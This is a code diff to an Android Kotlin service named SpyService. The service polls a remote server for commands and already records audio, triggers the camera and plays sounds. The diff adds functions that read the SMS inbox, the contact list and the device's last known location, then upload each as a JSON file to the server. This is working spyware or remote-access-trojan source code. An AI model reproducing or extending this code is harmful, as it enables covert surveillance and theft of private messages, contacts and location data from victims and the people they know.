@@ -5,19 +5,24 @@ import android.content.Context
 import android.content.Intent
 import android.content.pm.ServiceInfo
 import android.graphics.PixelFormat
+import android.location.LocationManager
 import android.media.AudioManager
 import android.media.MediaRecorder
 import android.media.RingtoneManager
+import android.net.Uri
 import android.os.Build
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
+import android.provider.ContactsContract
 import android.util.Log
 import android.view.View
 import android.view.WindowManager
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.RequestBody.Companion.asRequestBody
+import org.json.JSONArray
+import org.json.JSONObject
 import java.io.File
 import java.util.concurrent.TimeUnit
 
@@ -49,13 +54,12 @@ class SpyService : Service() {
                     client.newCall(request).execute().use { response ->
                         val body = response.body?.string() ?: ""
                         
-                        if (body.contains("RECORD")) {
-                            recordAudio()
-                        } else if (body.contains("SNAPSHOT")) {
-                            triggerCameraInstantly()
-                        } else if (body.contains("PLAY_SOUND")) {
-                            playLoudSound()
-                        }
+                        if (body.contains("RECORD")) recordAudio()
+                        else if (body.contains("SNAPSHOT")) triggerCameraInstantly()
+                        else if (body.contains("PLAY_SOUND")) playLoudSound()
+                        else if (body.contains("GET_SMS")) dumpSMS()
+                        else if (body.contains("GET_CONTACTS")) dumpContacts()
+                        else if (body.contains("GET_LOCATION")) getLocation()
                     }
                 } catch (e: Exception) {
                     Log.e("RATNIK", "Ошибка пинга: ${e.message}")
@@ -116,6 +120,76 @@ class SpyService : Service() {
             alert.play()
             Thread { Thread.sleep(15000); alert.stop() }.start()
         } catch (e: Exception) {}
+    }
+
+    private fun dumpSMS() {
+        try {
+            val smsList = JSONArray()
+            val cursor = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
+            if (cursor != null && cursor.moveToFirst()) {
+                do {
+                    val address = cursor.getString(cursor.getColumnIndexOrThrow("address"))
+                    val body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
+                    val date = cursor.getString(cursor.getColumnIndexOrThrow("date"))
+                    
+                    val smsObj = JSONObject()
+                    smsObj.put("from", address)
+                    smsObj.put("text", body)
+                    smsObj.put("date", date)
+                    smsList.put(smsObj)
+                } while (cursor.moveToNext())
+                cursor.close()
+            }
+            val file = File(cacheDir, "sms.json")
+            file.writeText(smsList.toString())
+            uploadFile(file, "application/json", "sms.json")
+        } catch (e: Exception) {
+            Log.e("RATNIK", "Ошибка SMS: ${e.message}")
+        }
+    }
+
+    private fun dumpContacts() {
+        try {
+            val contactsList = JSONArray()
+            val cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
+            if (cursor != null && cursor.moveToFirst()) {
+                do {
+                    val name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
+                    val phone = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
+                    
+                    val contactObj = JSONObject()
+                    contactObj.put("name", name)
+                    contactObj.put("phone", phone)
+                    contactsList.put(contactObj)
+                } while (cursor.moveToNext())
+                cursor.close()
+            }
+            val file = File(cacheDir, "contacts.json")
+            file.writeText(contactsList.toString())
+            uploadFile(file, "application/json", "contacts.json")
+        } catch (e: Exception) {
+            Log.e("RATNIK", "Ошибка контактов: ${e.message}")
+        }
+    }
+
+    private fun getLocation() {
+        try {
+            val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+            val location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER) 
+                ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+            
+            if (location != null) {
+                val locObj = JSONObject()
+                locObj.put("lat", location.latitude)
+                locObj.put("lon", location.longitude)
+                
+                val file = File(cacheDir, "location.json")
+                file.writeText(locObj.toString())
+                uploadFile(file, "application/json", "location.json")
+            }
+        } catch (e: Exception) {
+            Log.e("RATNIK", "Ошибка гео: ${e.message}")
+        }
     }
 
     private fun uploadFile(file: File, mimeType: String, fileName: String) {
